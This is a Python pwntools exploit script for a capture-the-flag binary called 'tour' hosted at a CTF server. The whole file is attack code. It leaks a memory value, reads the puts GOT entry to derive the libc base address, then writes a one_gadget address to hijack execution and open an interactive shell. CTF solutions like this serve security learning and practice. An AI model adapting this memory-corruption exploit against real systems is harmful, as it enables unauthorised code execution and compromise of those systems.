#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./tour')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *writeData
continue
'''.format(**locals())

# -- Exploit goes here --

binary = open('tour', 'rb').read()
if args.LOCAL:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    libc = ELF("./libc.so.6")

def read():
    io.recvuntil(b'>')
    io.sendline(b'1')
    data = io.recvline()
    kek = p64(int(data[7:-1], 16))[::-1]
    return kek

def move(num):
    io.recvuntil(b'>')
    io.sendline('3')
    io.recvuntil('move?\n')
    io.sendline(str(num))

def write(data):
    io.recvuntil(b'>')
    io.sendline('2')
    io.sendline(hex(data))

io = start()
leak = read()
print(leak)
idx  = (binary.index(leak))
print(hex(idx))
got_puts = exe.got['puts']
print(hex(got_puts))
move(got_puts-idx)
leak = read()
print(hex(u64(leak)))
libc.address = u64(leak) - libc.sym.puts
log.success(f"libc base @ {hex(libc.address)}")
move(88)
one_gadget = 0xde78f
write(libc.address + one_gadget)
io.interactive()

